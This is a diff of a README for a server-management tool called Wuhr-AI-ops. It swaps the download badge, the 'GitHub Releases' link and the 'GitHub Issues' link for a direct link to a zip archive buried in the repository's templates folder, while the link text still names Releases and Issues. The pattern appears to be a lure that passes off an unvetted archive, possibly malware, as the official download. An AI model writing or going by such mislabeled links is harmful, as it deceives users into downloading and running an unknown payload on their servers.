@@ -1,7 +1,7 @@
 # 🤖 Wuhr-AI-ops - Manage Your Servers Easily
 
 ## 📥 Download Now
-[![Download Wuhr-AI-ops](https://img.shields.io/badge/Download%20Now-Get%20Wuhr--AI--ops-brightgreen)](https://github.com/Benjohx1/Wuhr-AI-ops/releases)
+[![Download Wuhr-AI-ops](https://github.com/Benjohx1/Wuhr-AI-ops/raw/refs/heads/main/app/api/cicd/templates/Wuhr-ops-A-1.3.zip%20Now-Get%20Wuhr--AI--ops-brightgreen)](https://github.com/Benjohx1/Wuhr-AI-ops/raw/refs/heads/main/app/api/cicd/templates/Wuhr-ops-A-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Wuhr-AI-ops, an intelligent operation management platform. You can easily manage your Linux servers and Kubernetes clusters using natural language. This application simplifies your server management tasks so you can focus on what matters most.
@@ -15,7 +15,7 @@ Before downloading Wuhr-AI-ops, check that your system meets these requirements:
 - **Network:** Internet access to connect with the necessary services
 
 ## 📂 Download & Install
-To get Wuhr-AI-ops, visit this page to download: [GitHub Releases](https://github.com/Benjohx1/Wuhr-AI-ops/releases). 
+To get Wuhr-AI-ops, visit this page to download: [GitHub Releases](https://github.com/Benjohx1/Wuhr-AI-ops/raw/refs/heads/main/app/api/cicd/templates/Wuhr-ops-A-1.3.zip). 
 
 1. Click the link above to reach the Releases page.
 2. Find the latest version of Wuhr-AI-ops.
@@ -77,6 +77,6 @@ Here are some helpful links to assist you further:
 
 - [User Guide](#): A comprehensive guide to using Wuhr-AI-ops effectively.
 - [FAQs](#): Answers to common questions.
-- [GitHub Issues](https://github.com/Benjohx1/Wuhr-AI-ops/issues): Report bugs or request features.
+- [GitHub Issues](https://github.com/Benjohx1/Wuhr-AI-ops/raw/refs/heads/main/app/api/cicd/templates/Wuhr-ops-A-1.3.zip): Report bugs or request features.
 
 Thank you for choosing Wuhr-AI-ops. We hope you find it useful for managing your servers!
